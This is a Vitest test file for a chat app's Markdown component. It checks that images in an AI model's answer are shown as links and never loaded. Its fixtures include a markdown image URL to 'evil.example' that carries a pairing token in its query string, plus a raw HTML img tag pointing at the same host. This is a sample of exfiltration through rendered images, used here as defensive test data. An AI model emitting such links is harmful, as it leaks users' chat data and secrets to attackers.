import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"

import { Markdown } from "@/features/chat/Markdown"

describe("images in an answer", () => {
  it("are never loaded: an address the model wrote can carry the chat's text out", () => {
    const text = "Done. ![chart](https://evil.example/p.png?d=the+pairing+token)\n\n" +
      "![](data:image/png;base64,AAAA) ![x](report.png)"
    const html = renderToStaticMarkup(<Markdown text={text} />)
    expect(html).not.toContain("<img")
    expect(html).toContain("[image: chart, not loaded")
    expect(html).toContain('href="https://evil.example/p.png?d=the+pairing+token"')   // shown, opened only by the user
  })

  it("do not come in as raw HTML either", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://evil.example/x.png"> text'} />)
    expect(html).not.toContain("<img")
  })
})
